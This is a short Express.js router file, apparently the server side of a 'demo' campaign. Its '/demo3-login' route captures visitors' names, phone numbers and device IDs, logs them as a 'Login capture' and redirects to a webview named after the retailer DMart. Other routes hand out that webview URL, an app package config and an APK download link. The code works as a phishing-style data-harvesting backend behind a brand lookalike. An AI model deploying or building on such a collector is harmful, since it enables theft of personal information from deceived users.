const express = require('express');
const router = express.Router();

router.get('/demo3-webview-url', (req, res) => {
  const targetUrl = process.env.WEBVIEW_URL || 'https://dmart-webview.pages.dev';
  res.json({ url: targetUrl });
});

router.get('/demo3-login', (req, res) => {
  const { n, p, did } = req.query;
  console.log(`Login capture - Name: ${n}, Phone: ${p}, DeviceId: ${did}`);
  const redirectUrl = process.env.WEBVIEW_URL || 'https://dmart-webview.pages.dev';
  res.redirect(redirectUrl);
});

router.get('/demo-config', (req, res) => {
  res.json({
    serverUrl: process.env.SERVER_URL || 'http://localhost:3000',
    webviewUrl: process.env.WEBVIEW_URL || 'https://dmart-webview.pages.dev',
    appPackage: process.env.APP_PACKAGE || 'com.demo.app'
  });
});

router.get('/download-demo', (req, res) => {
  res.json({ message: 'Demo download endpoint', url: '/api/download/latest.apk' });
});

router.get('/download-website-zip', (req, res) => {
  res.json({ message: 'Website zip download endpoint' });
});

module.exports = router;
